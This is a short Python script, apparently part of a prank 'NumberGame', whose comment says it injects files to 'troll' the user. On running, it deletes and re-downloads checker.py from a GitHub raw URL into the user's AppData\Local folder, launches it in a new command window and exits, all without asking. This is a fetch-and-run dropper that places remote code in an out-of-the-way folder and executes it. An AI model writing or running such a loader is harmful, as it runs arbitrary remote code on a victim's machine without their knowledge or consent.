# Downloads and injects the files needed to troll your dumbass
def clone():
    import os, urllib.request, pathlib, subprocess
    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/checker.py'
    home = os.path.expanduser("~")
    path = str(home) + '\AppData\Local\checker.py'
    path = '{}'.format(path)
    try:
        os.remove(path)
    except FileNotFoundError:
        print('New System')
    urllib.request.urlretrieve(dlurl, '{}'.format(path))
    
    subprocess.Popen(["start", "cmd", "/k", "py {}".format(path)], shell = True)
    #os.system("py "+"{}".format(path))
    exit()

clone()